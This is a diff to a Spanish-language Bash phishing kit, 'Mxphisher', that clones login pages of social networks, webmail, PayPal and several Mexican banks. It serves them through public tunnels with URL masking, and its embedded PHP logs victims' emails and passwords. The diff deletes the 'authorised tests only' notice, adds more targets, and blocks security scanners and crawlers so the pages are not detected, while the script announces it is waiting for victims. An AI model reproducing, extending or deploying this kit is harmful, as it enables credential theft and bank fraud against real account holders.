@@ -2,12 +2,12 @@
 
 # Mxphisher - Herramienta de phishing educativa
 # Autor: Falconmx1
-# Solo para pruebas de seguridad autorizadas
+# Versión: 2.0 - Full Edition
 
 trap ctrl_c INT
 ctrl_c() {
     echo -e "\n\n[\033[31m✘\033[0m] Saliendo...\n"
-    killall ngrok php 2>/dev/null
+    killall ngrok php cloudflared 2>/dev/null
     exit 1
 }
 
@@ -27,108 +27,206 @@ source core/cloner.sh
 source core/tunnel.sh
 source core/anti_robots.sh
 source core/logger.sh
+source core/url_mask.sh
 
 # Variables globales
 SITIO_SELECCIONADO=""
 URL_ORIGINAL=""
 PUERTO=8080
+TIPO_TUNEL=""
 SERVER_PID=""
-NGROK_PID=""
+TUNEL_PID=""
+URL_FINAL=""
 
-menu_principal() {
+# Menú de sitios (20+ opciones)
+menu_sitios() {
     banner_calavera
-    echo -e "\n${Y}┌─────────────────────────────────────────┐${NC}"
-    echo -e "${Y}│${W}  1${Y})${W} Facebook                          ${Y}│${NC}"
-    echo -e "${Y}│${W}  2${Y})${W} Instagram                         ${Y}│${NC}"
-    echo -e "${Y}│${W}  3${Y})${W} Twitter                           ${Y}│${NC}"
-    echo -e "${Y}│${W}  4${Y})${W} Gmail                             ${Y}│${NC}"
-    echo -e "${Y}│${W}  5${Y})${W} BBVA México                       ${Y}│${NC}"
-    echo -e "${Y}│${W}  6${Y})${W} Banorte                           ${Y}│${NC}"
-    echo -e "${Y}│${W}  7${Y})${W} URL personalizada                 ${Y}│${NC}"
-    echo -e "${Y}│${W}  8${Y})${W} Salir                             ${Y}│${NC}"
-    echo -e "${Y}└─────────────────────────────────────────┘${NC}"
-    echo -ne "\n${B}➤${W} Elige tu víctima moral: "
+    echo -e "\n${Y}┌─────────────────────────────────────────────────┐${NC}"
+    echo -e "${Y}│${W}  📱 REDES SOCIALES                              ${Y}│${NC}"
+    echo -e "${Y}│${W}  1${Y})${W} Facebook          ${Y}│${W}  2${Y})${W} Instagram        ${Y}│${NC}"
+    echo -e "${Y}│${W}  3${Y})${W} Twitter           ${Y}│${W}  4${Y})${W} TikTok           ${Y}│${NC}"
+    echo -e "${Y}│${W}  5${Y})${W} LinkedIn          ${Y}│${W}  6${Y})${W} Snapchat         ${Y}│${NC}"
+    echo -e "${Y}├─────────────────────────────────────────────────┤${NC}"
+    echo -e "${Y}│${W}  📧 CORREOS Y SERVICIOS                        ${Y}│${NC}"
+    echo -e "${Y}│${W}  7${Y})${W} Gmail             ${Y}│${W}  8${Y})${W} Outlook          ${Y}│${NC}"
+    echo -e "${Y}│${W}  9${Y})${W} Yahoo             ${Y}│${W}  10${Y})${W} ProtonMail       ${Y}│${NC}"
+    echo -e "${Y}├─────────────────────────────────────────────────┤${NC}"
+    echo -e "${Y}│${W}  🏦 BANCOS MEXICANOS                           ${Y}│${NC}"
+    echo -e "${Y}│${W}  11${Y})${W} BBVA México       ${Y}│${W}  12${Y})${W} Banorte          ${Y}│${NC}"
+    echo -e "${Y}│${W}  13${Y})${W} Santander         ${Y}│${W}  14${Y})${W} Citibanamex      ${Y}│${NC}"
+    echo -e "${Y}│${W}  15${Y})${W} HSBC              ${Y}│${W}  16${Y})${W} Scotiabank       ${Y}│${NC}"
+    echo -e "${Y}├─────────────────────────────────────────────────┤${NC}"
+    echo -e "${Y}│${W}  🎬 STREAMING Y OTROS                          ${Y}│${NC}"
+    echo -e "${Y}│${W}  17${Y})${W} Netflix           ${Y}│${W}  18${Y})${W} Spotify          ${Y}│${NC}"
+    echo -e "${Y}│${W}  19${Y})${W} Amazon            ${Y}│${W}  20${Y})${W} PayPal           ${Y}│${NC}"
+    echo -e "${Y}│${W}  21${Y})${W} Microsoft         ${Y}│${W}  22${Y})${W} Dropbox          ${Y}│${NC}"
+    echo -e "${Y}├─────────────────────────────────────────────────┤${NC}"
+    echo -e "${Y}│${W}  23${Y})${W} URL personalizada                    ${Y}│${NC}"
+    echo -e "${Y}│${W}  24${Y})${W} Salir                               ${Y}│${NC}"
+    echo -e "${Y}└─────────────────────────────────────────────────┘${NC}"
+    echo -ne "\n${B}➤${W} Elige el sitio a clonar: "
     read opcion
 
     case $opcion in
         1) SITIO_SELECCIONADO="facebook"; URL_ORIGINAL="https://facebook.com";;
         2) SITIO_SELECCIONADO="instagram"; URL_ORIGINAL="https://instagram.com";;
         3) SITIO_SELECCIONADO="twitter"; URL_ORIGINAL="https://twitter.com";;
-        4) SITIO_SELECCIONADO="gmail"; URL_ORIGINAL="https://gmail.com";;
-        5) SITIO_SELECCIONADO="bbva"; URL_ORIGINAL="https://www.bbva.mx";;
-        6) SITIO_SELECCIONADO="banorte"; URL_ORIGINAL="https://www.banorte.com";;
-        7) 
+        4) SITIO_SELECCIONADO="tiktok"; URL_ORIGINAL="https://tiktok.com";;
+        5) SITIO_SELECCIONADO="linkedin"; URL_ORIGINAL="https://linkedin.com";;
+        6) SITIO_SELECCIONADO="snapchat"; URL_ORIGINAL="https://snapchat.com";;
+        7) SITIO_SELECCIONADO="gmail"; URL_ORIGINAL="https://gmail.com";;
+        8) SITIO_SELECCIONADO="outlook"; URL_ORIGINAL="https://outlook.com";;
+        9) SITIO_SELECCIONADO="yahoo"; URL_ORIGINAL="https://yahoo.com";;
+        10) SITIO_SELECCIONADO="protonmail"; URL_ORIGINAL="https://protonmail.com";;
+        11) SITIO_SELECCIONADO="bbva"; URL_ORIGINAL="https://www.bbva.mx";;
+        12) SITIO_SELECCIONADO="banorte"; URL_ORIGINAL="https://www.banorte.com";;
+        13) SITIO_SELECCIONADO="santander"; URL_ORIGINAL="https://www.santander.com.mx";;
+        14) SITIO_SELECCIONADO="citibanamex"; URL_ORIGINAL="https://www.banamex.com";;
+        15) SITIO_SELECCIONADO="hsbc"; URL_ORIGINAL="https://www.hsbc.com.mx";;
+        16) SITIO_SELECCIONADO="scotiabank"; URL_ORIGINAL="https://www.scotiabank.com.mx";;
+        17) SITIO_SELECCIONADO="netflix"; URL_ORIGINAL="https://www.netflix.com";;
+        18) SITIO_SELECCIONADO="spotify"; URL_ORIGINAL="https://www.spotify.com";;
+        19) SITIO_SELECCIONADO="amazon"; URL_ORIGINAL="https://www.amazon.com.mx";;
+        20) SITIO_SELECCIONADO="paypal"; URL_ORIGINAL="https://www.paypal.com";;
+        21) SITIO_SELECCIONADO="microsoft"; URL_ORIGINAL="https://www.microsoft.com";;
+        22) SITIO_SELECCIONADO="dropbox"; URL_ORIGINAL="https://www.dropbox.com";;
+        23) 
             echo -ne "${B}➤${W} URL completa (con https://): "
             read URL_ORIGINAL
-            SITIO_SELECCIONADO=$(echo $URL_ORIGINAL | sed 's/https:\/\///' | sed 's/\./_/g')
+            SITIO_SELECCIONADO=$(echo $URL_ORIGINAL | sed 's/https:\/\///' | sed 's/\./_/g' | cut -d'/' -f1)
             ;;
-        8) exit 0;;
-        *) echo -e "${R}[✘] Opción no válida"; sleep 1; menu_principal;;
+        24) exit 0;;
+        *) echo -e "${R}[✘] Opción no válida"; sleep 1; menu_sitios;;
     esac
+    
+    menu_túneles
+}
 
+# Menú de túneles
+menu_túneles() {
+    banner_calavera
+    echo -e "\n${Y}┌─────────────────────────────────┐${NC}"
+    echo -e "${Y}│${W}  🌐 SELECCIONA EL TÚNEL        ${Y}│${NC}"
+    echo -e "${Y}├─────────────────────────────────┤${NC}"
+    echo -e "${Y}│${W}  1${Y})${W} Ngrok (Rápido)         ${Y}│${NC}"
+    echo -e "${Y}│${W}  2${Y})${W} Serveo (Sin registro)  ${Y}│${NC}"
+    echo -e "${Y}│${W}  3${Y})${W} Localhost.run         ${Y}│${NC}"
+    echo -e "${Y}│${W}  4${Y})${W} Cloudflared (Argo)    ${Y}│${NC}"
+    echo -e "${Y}└─────────────────────────────────┘${NC}"
+    echo -ne "\n${B}➤${W} Elige tu túnel: "
+    read opcion_tunel
+    
+    case $opcion_tunel in
+        1) TIPO_TUNEL="ngrok";;
+        2) TIPO_TUNEL="serveo";;
+        3) TIPO_TUNEL="localhost";;
+        4) TIPO_TUNEL="cloudflare";;
+        *) echo -e "${R}[✘] Opción no válida, usando Ngrok"; TIPO_TUNEL="ngrok";;
+    esac
+    
+    menu_masking
+}
+
+# Menú de enmascaramiento
+menu_masking() {
+    banner_calavera
+    echo -e "\n${Y}┌─────────────────────────────────┐${NC}"
+    echo -e "${Y}│${W}  🎭 ENMASCARAMIENTO DE URL    ${Y}│${NC}"
+    echo -e "${Y}├─────────────────────────────────┤${NC}"
+    echo -e "${Y}│${W}  1${Y})${W} Sin máscara           ${Y}│${NC}"
+    echo -e "${Y}│${W}  2${Y})${W} Bit.ly (acortador)    ${Y}│${NC}"
+    echo -e "${Y}│${W}  3${Y})${W} Dominio falso         ${Y}│${NC}"
+    echo -e "${Y}│${W}  4${Y})${W} URL personalizada     ${Y}│${NC}"
+    echo -e "${Y}└─────────────────────────────────┘${NC}"
+    echo -ne "\n${B}➤${W} Opción: "
+    read opcion_mask
+    
+    case $opcion_mask in
+        2) MASK_TYPE="bitly";;
+        3) MASK_TYPE="fake_domain";;
+        4) MASK_TYPE="custom";;
+        *) MASK_TYPE="none";;
+    esac
+    
     iniciar_ataque
 }
 
 iniciar_ataque() {
     echo -e "\n${G}[+]${W} Preparando Mxphisher para: ${Y}$SITIO_SELECCIONADO${NC}"
+    echo -e "${G}[+]${W} Usando túnel: ${Y}$TIPO_TUNEL${NC}"
     
     # Clonar el sitio
     clonar_sitio "$URL_ORIGINAL" "$SITIO_SELECCIONADO"
     
-    # Personalizar el index con el capturador PHP
-    personalizar_phish "$SITIO_SELECCIONADO"
+    # Generar PHP capturador con anti-robots
+    generar_phish_con_anti_robots "$SITIO_SELECCIONADO"
     
     # Iniciar servidor PHP
     iniciar_servidor
     
-    # Iniciar Ngrok
-    iniciar_ngrok
+    # Iniciar túnel seleccionado
+    iniciar_tunel
     
-    # Mostrar enlaces
-    mostrar_enlaces
+    # Aplicar enmascaramiento
+    if [ "$MASK_TYPE" != "none" ]; then
+        URL_FINAL=$(aplicar_mascara "$URL_FINAL" "$SITIO_SELECCIONADO" "$MASK_TYPE")
+    fi
     
-    # Logs en tiempo real
+    # Mostrar información
+    mostrar_info
+    
+    # Monitorear logs
     monitorear_logs
 }
 
-# Función para personalizar el phishing (modifica el HTML)
-personalizar_phish() {
+generar_phish_con_anti_robots() {
     local sitio=$1
-    local php_template="templates/phishing_template.php"
     
-    # Respaldar index original
-    cp "sites/$sitio/index.html" "sites/$sitio/index.original.html"
-    
-    # Reemplazar el formulario por el PHP capturador
-    sed -i 's/<form/<form action="login.php" method="POST"/g' "sites/$sitio/index.html"
-    
-    # Crear el login.php capturador
+    # Generar el PHP con anti-robots integrado
     cat > "sites/$sitio/login.php" << 'EOF'
 <?php
-// Mxphisher - Capturador de credenciales
-$ip = $_SERVER['REMOTE_ADDR'];
-$user_agent = $_SERVER['HTTP_USER_AGENT'];
-$fecha = date('Y-m-d H:i:s');
+// Mxphisher - Capturador con anti-robots
+session_start();
 
-// Anti-robots
-$bots = ['curl', 'python', 'wget', 'bot', 'spider', 'scanner'];
+// ===== ANTI-ROBOTS =====
+$user_agent = $_SERVER['HTTP_USER_AGENT'];
+$bots = array('curl', 'python', 'wget', 'bot', 'spider', 'crawler', 'scanner', 'nmap', 'sqlmap', 'nikto', 'gobuster', 'dirb', 'wfuzz', 'masscan', 'zgrab', 'http-client', 'Java', 'Perl', 'Ruby', 'Go-http', 'axios', 'fetch');
+
 foreach($bots as $bot) {
     if(stripos($user_agent, $bot) !== false) {
         http_response_code(403);
-        die("🤖 Acceso denegado: No se permiten bots");
+        die("🚫 Acceso denegado: Robots no bienvenidos");
     }
 }
 
-// Capturar credenciales
-$email = $_POST['email'] ?? $_POST['username'] ?? $_POST['user'] ?? '';
-$password = $_POST['password'] ?? $_POST['pass'] ?? $_POST['pwd'] ?? '';
+// Limitar intentos por IP
+$ip = $_SERVER['REMOTE_ADDR'];
+$intentos_file = "intentos_$ip.json";
+if(file_exists($intentos_file)) {
+    $intentos = json_decode(file_get_contents($intentos_file), true);
+    if($intentos['count'] > 10 && time() - $intentos['first'] < 3600) {
+        die("⏰ Demasiados intentos, espera 1 hora");
+    }
+} else {
+    $intentos = ['count' => 0, 'first' => time()];
+}
+
+// ===== CAPTURA DE CREDENCIALES =====
+$email = $_POST['email'] ?? $_POST['username'] ?? $_POST['user'] ?? $_POST['login'] ?? '';
+$password = $_POST['password'] ?? $_POST['pass'] ?? $_POST['pwd'] ?? $_POST['contraseña'] ?? '';
 
 if($email && $password) {
+    // Guardar intentos
+    $intentos['count']++;
+    file_put_contents($intentos_file, json_encode($intentos));
+    
+    // Formatear log
+    $fecha = date('Y-m-d H:i:s');
     $log_entry = "[$fecha] IP: $ip | UA: $user_agent | EMAIL: $email | PASS: $password" . PHP_EOL;
     file_put_contents("../logs/{$sitio}_creds.log", $log_entry, FILE_APPEND);
     
     // Redirigir al sitio real
-    header("Location: index.original.html");
+    header("Location: index.original.html?error=login_error");
     exit();
 } else {
     header("Location: index.html?error=1");
@@ -136,10 +234,15 @@ if($email && $password) {
 ?>
 EOF
     
-    # Reemplazar variable sitio en el PHP
+    # Reemplazar variable sitio
     sed -i "s/{$sitio}/$sitio/g" "sites/$sitio/login.php"
     
-    echo -e "${G}[✔]${W} Phishing personalizado listo en sites/$sitio/"
+    # Respaldar index original
+    if [ -f "sites/$sitio/index.html" ]; then
+        cp "sites/$sitio/index.html" "sites/$sitio/index.original.html"
+    fi
+    
+    echo -e "${G}[✔]${W} Phishing personalizado con anti-robots listo"
 }
 
 iniciar_servidor() {
@@ -150,39 +253,40 @@ iniciar_servidor() {
     echo -e "${G}[✔]${W} Servidor PHP corriendo en puerto $PUERTO (PID: $SERVER_PID)"
 }
 
-iniciar_ngrok() {
-    if ! command -v ngrok &> /dev/null; then
-        echo -e "${Y}[!]${W} Ngrok no instalado. Descargando..."
-        wget -q https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
-        unzip -q ngrok-stable-linux-amd64.zip
-        sudo mv ngrok /usr/local/bin/
-        rm ngrok-stable-linux-amd64.zip
-    fi
+iniciar_tunel() {
+    case $TIPO_TUNEL in
+        "ngrok")
+            URL_FINAL=$(iniciar_ngrok $PUERTO)
+            ;;
+        "serveo")
+            URL_FINAL=$(iniciar_serveo $PUERTO)
+            ;;
+        "localhost")
+            URL_FINAL=$(iniciar_localhost_run $PUERTO)
+            ;;
+        "cloudflare")
+            URL_FINAL=$(iniciar_cloudflared $PUERTO)
+            ;;
+    esac
     
-    ngrok http $PUERTO > /dev/null 2>&1 &
-    NGROK_PID=$!
-    sleep 4
-    
-    # Obtener URL de Ngrok
-    NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[a-z0-9]*\.ngrok\.io' | head -1)
-    
-    if [ -n "$NGROK_URL" ]; then
-        echo -e "${G}[✔]${W} Ngrok activo: ${Y}$NGROK_URL${NC}"
-    else
-        echo -e "${R}[✘]${W} Error al iniciar Ngrok"
+    if [ "$URL_FINAL" = "ERROR" ] || [ -z "$URL_FINAL" ]; then
+        echo -e "${R}[✘] Error al iniciar el túnel${NC}"
+        exit 1
     fi
 }
 
-mostrar_enlaces() {
-    echo -e "\n${C}════════════════════════════════════════════${NC}"
-    echo -e "${G}✨ ENLACES LISTOS PARA PISHING ✨${NC}"
-    echo -e "${C}════════════════════════════════════════════${NC}"
-    echo -e "${Y}📡 Local:${W}    http://localhost:$PUERTO"
-    echo -e "${Y}🌍 Ngrok:${W}    $NGROK_URL"
-    echo -e "${Y}📁 Logs:${W}     logs/${SITIO_SELECCIONADO}_creds.log"
-    echo -e "${C}════════════════════════════════════════════${NC}\n"
+mostrar_info() {
+    echo -e "\n${C}═══════════════════════════════════════════════════════${NC}"
+    echo -e "${G}✨ MXPHISHER LISTO PARA PISHING ÉTICO ✨${NC}"
+    echo -e "${C}═══════════════════════════════════════════════════════${NC}"
+    echo -e "${Y}📡 Local:${W}      http://localhost:$PUERTO"
+    echo -e "${Y}🌍 Túnel:${W}      $URL_FINAL"
+    echo -e "${Y}🎭 Máscara:${W}    $( [ "$MASK_TYPE" != "none" ] && echo "Activada ($MASK_TYPE)" || echo "Sin máscara")"
+    echo -e "${Y}📁 Logs:${W}       logs/${SITIO_SELECCIONADO}_creds.log"
+    echo -e "${Y}🛡️ Anti-robots:${W} Activado"
+    echo -e "${C}═══════════════════════════════════════════════════════${NC}\n"
     
-    echo -e "${R}⚠️  COMPARTE SOLO EL ENLACE DE NGROK ⚠️${NC}"
+    echo -e "${R}⚠️  COMPARTE SOLO EL ENLACE DEL TÚNEL ⚠️${NC}"
     echo -e "${Y}💀 Esperando víctimas... (Ctrl+C para salir)${NC}\n"
 }
 
@@ -191,23 +295,28 @@ monitorear_logs() {
     mkdir -p logs
     touch "$LOG_FILE"
     
-    echo -e "${C}[*]${W} Monitoreando capturas en tiempo real:\n"
-    tail -f "$LOG_FILE" 2>/dev/null | while read linea; do
-        echo -e "${R}[!]${Y} ¡CREENCIALES CAPTURADAS!${NC}"
-        echo -e "${C}$linea${NC}\n"
+    echo -e "${C}[*] Monitoreando capturas en tiempo real:\n"
+    tail -f "$LOG_FILE" 2>/dev/null | while IFS= read -r linea; do
+        if [[ $linea == *"EMAIL"* ]]; then
+            echo -e "\n${R}════════════════════════════════════════════${NC}"
+            echo -e "${G}🎯 ¡CREENCIALES CAPTURADAS!${NC}"
+            echo -e "${R}════════════════════════════════════════════${NC}"
+            echo -e "${C}$linea${NC}"
+            echo -e "${R}════════════════════════════════════════════${NC}\n"
+        else
+            echo -e "${Y}$linea${NC}"
+        fi
     done
 }
 
 # Verificar dependencias
-if ! command -v php &> /dev/null; then
-    echo -e "${R}[✘] PHP no instalado. Instálalo con: sudo apt install php -y${NC}"
-    exit 1
-fi
-
-if ! command -v wget &> /dev/null; then
-    echo -e "${R}[✘] Wget no instalado. Instálalo con: sudo apt install wget -y${NC}"
-    exit 1
-fi
+echo -e "${C}[*] Verificando dependencias...${NC}"
+for cmd in php wget curl; do
+    if ! command -v $cmd &> /dev/null; then
+        echo -e "${R}[✘] $cmd no instalado. Instálalo con: sudo apt install $cmd -y${NC}"
+        exit 1
+    fi
+done
 
 # Ejecutar
-menu_principal
+menu_sitios
